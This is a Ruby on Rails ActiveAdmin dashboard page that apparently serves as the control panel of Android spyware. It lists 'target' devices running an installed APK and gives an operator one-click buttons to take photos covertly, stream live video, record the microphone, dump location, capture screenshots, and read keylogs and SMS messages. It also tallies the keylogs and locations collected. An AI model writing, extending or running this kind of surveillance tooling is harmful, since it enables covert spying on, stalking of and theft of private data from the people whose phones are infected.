ActiveAdmin.register_page "Dashboard" do
  menu priority: 1, label: "🚀 Command Center"

  content title: "🚀 Device Command Center" do
    
    # 1. Connected Devices Grid
    devices = Smartphone.joins(:apk_installation)
                       .where("apk_installations.status = ?", "installed")
    
    if devices.empty?
      div class: "empty-state" do
        h2 "Waiting for Devices..."
        para "Install the APK on a target device to see it here."
        para "APK Download URL: http://#{request.host}:#{request.port}/app-release.apk", class: "apk-link"
      end
    else
      div class: "device-grid" do
        devices.each do |device|
          panel "", class: "device-card" do
            # Device Header
            div class: "device-header" do
              div class: "device-icon" do
                text_node "📱"
              end
              div class: "device-details" do
                h3 device.name || "Unknown Device"
                span device.operating_system, class: "device-os"
                status_badge "🟢 Online", class: "status-online"
              end
            end

            # Quick Actions Grid
            div class: "control-grid" do
              # Camera
              link_to take_picture_smartphones_path(device_id: device.id), method: :post, remote: true, class: "control-btn camera" do
                span "📷", class: "icon"
                span "Take Photo", class: "label"
              end

              # Live Video
              link_to admin_live_streaming_path(device_id: device.id), class: "control-btn video" do
                span "📹", class: "icon"
                span "Live Video", class: "label"
              end

              # Record Audio
              link_to microphone_rec_recordings_path(device_id: device.id, duration: 10), method: :post, remote: true, class: "control-btn audio" do
                span "🎤", class: "icon"
                span "Record Mic", class: "label"
              end

              # Location
              link_to dump_location_geo_locations_path(device_id: device.id), remote: true, class: "control-btn location" do
                span "📍", class: "icon"
                span "Location", class: "label"
              end
              
              # Screen Capture
              link_to dump_screen_snap_screenshots_path(device_id: device.id), remote: true, class: "control-btn screen" do
                 span "🖥️", class: "icon"
                 span "Screenshot", class: "label"
              end

              # Keylogs
              link_to admin_keylogs_path(q: { smartphone_id_eq: device.id }), class: "control-btn keylogs" do
                span "⌨️", class: "icon"
                span "Keylogs", class: "label"
              end

              # SMS
              link_to admin_sms_messages_path(q: { smartphone_id_eq: device.id }), class: "control-btn sms" do
                span "💬", class: "icon"
                span "SMS", class: "label"
              end

              # More Actions - Link to device details  
              link_to "#", onclick: "alert('Navigate to device detail page'); return false;", class: "control-btn files" do
                span "📂", class: "icon"
                span "Details", class: "label"
              end
            end
          end
        end
      end
    end

    # Quick Stats Panel
    columns do
      column do
        panel "📊 System Overview", class: "stats-panel" do
          total_devices = Smartphone.count
          online_devices = devices.count
          total_photos = Picture.count
          total_keylogs = Keylog.count
          total_locations = GeoLocation.count

          div class: "stats-grid" do
            div class: "stat-card" do
              h3 "#{online_devices} / #{total_devices}"
              para "Devices Online"
            end
            div class: "stat-card" do
              h3 total_photos.to_s
              para "Photos Captured"
            end
            div class: "stat-card" do
              h3 total_keylogs.to_s
              para "Keylogs Collected"
            end
            div class: "stat-card" do
              h3 total_locations.to_s
              para "Locations Tracked"
            end
          end
        end
      end
    end

    # CSS Styles for Command Center
    # Moved to app/assets/stylesheets/dashboard.scss
  end
end
